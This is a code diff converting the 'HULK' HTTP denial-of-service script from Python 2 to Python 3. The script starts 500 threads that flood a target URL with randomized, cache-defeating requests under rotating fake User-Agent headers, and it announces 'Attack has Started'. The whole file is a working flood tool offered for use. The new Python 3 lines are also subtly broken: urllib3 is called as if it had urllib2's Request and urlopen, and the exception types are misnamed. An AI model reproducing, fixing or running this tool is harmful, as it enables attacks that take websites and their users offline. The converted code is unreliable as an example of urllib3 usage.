@@ -7,7 +7,7 @@
 #
 # author :  OpIcarus , version 1.0
 # ----------------------------------------------------------------------------------------------
-import urllib2
+import urllib3
 import sys
 import threading
 import random
@@ -69,10 +69,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+	print ('---------------------------------------------------')
+	print ('USAGE: python hulk.py <url>')
+	print ('you can add "safe" after url, to autoshut after dos')
+	print ('---------------------------------------------------')
 
 	
 #http request
@@ -84,7 +84,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -93,18 +93,18 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+			urllib3.urlopen(request)
+	except urllib3.util.timeout as e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print ('Response Code 500')
 			code=500
-	except urllib2.URLError, e:
+	except urllib3.URLError as e:
 			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib3.urlopen(request)
 	return(code)		
 
 	
@@ -116,7 +116,7 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except:
 			pass
 
 # monitors http threads and counts requests
@@ -124,11 +124,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+			if (previous+100<request_counter) & (previous!=request_counter):
+				print (f"{request_counter} Requests Sent")
 				previous=request_counter
 		if flag==2:
-			print "\n-- OpNestle has Started --"
+			print ("\n-- OpNestle has Started --")
 
 #execute 
 if len(sys.argv) < 2:
@@ -139,15 +139,18 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- Attack has Started HA HA HA HA --"
+		print ("-- Attack has Started HA HA HA HA --")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
+		try:
+			host = re.search('http\://([^/]*)/?.*', url).group(1)
+		except:
+			print ('Invalid URL format, missing HTTP://')
+			sys.exit()
 		for i in range(500):
 			t = HTTPThread()
 			t.start()
